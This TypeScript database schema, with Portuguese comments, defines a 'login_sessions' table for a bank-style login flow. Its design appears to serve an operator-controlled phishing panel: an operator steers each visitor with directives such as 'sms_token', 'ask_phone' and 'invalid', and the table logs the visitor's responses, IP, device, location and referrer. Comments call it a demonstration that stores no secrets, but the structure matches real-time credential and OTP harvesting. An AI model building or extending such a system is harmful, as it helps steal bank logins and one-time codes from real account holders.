import { sql } from "drizzle-orm";
import { jsonb, pgTable, text, timestamp, uuid } from "drizzle-orm/pg-core";

/** Uma etapa do fluxo público percorrida pelo visitante (SEM senha/OTP). */
export type SessionStep = { route: string; label: string | null; at: string };

/** Registro cronológico de comandos do operador e respostas do cliente. */
export type SessionHistoryEntry = { type: string; label: string; at: string };

/**
 * Sessão única por visitante do fluxo público (Pessoa Física ou Jurídica).
 *
 * AMBIENTE DE DEMONSTRAÇÃO: nunca armazena senha, OTP/token SMS ou qualquer
 * segredo. Guarda apenas metadados do dispositivo, a etapa atual do fluxo e o
 * histórico de comandos do operador para orientar a interface.
 */
export const loginSessionsTable = pgTable("login_sessions", {
  id: uuid("id").defaultRandom().primaryKey(),
  sessionId: text("session_id").notNull().unique(),
  flowType: text("flow_type"), // 'PF' | 'PJ'
  identifier: text("identifier"), // rótulo (ex.: "Ag 0001 / Conta 1234"), nunca segredo
  currentStep: text("current_step"),
  status: text("status").notNull().default("active"), // 'active' | 'ended'
  directive: text("directive").notNull().default("none"), // none|hold|invalid|sms_token|ask_phone|ended
  smsLast3: text("sms_last3"), // 3 últimos dígitos fictícios (homologação) — não sensível
  smsTestCode: text("sms_test_code"), // código de homologação gerado pelo sistema (fictício)
  steps: jsonb("steps").$type<SessionStep[]>().notNull().default(sql`'[]'::jsonb`),
  history: jsonb("history").$type<SessionHistoryEntry[]>().notNull().default(sql`'[]'::jsonb`),
  ip: text("ip"),
  browser: text("browser"),
  deviceType: text("device_type"),
  os: text("os"),
  language: text("language"),
  timezone: text("timezone"),
  screen: text("screen"),
  referrer: text("referrer"),
  userAgent: text("user_agent"),
  location: text("location"),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
  updatedAt: timestamp("updated_at", { withTimezone: true }).notNull().defaultNow(),
});

export type LoginSessionRow = typeof loginSessionsTable.$inferSelect;
export type InsertLoginSession = typeof loginSessionsTable.$inferInsert;
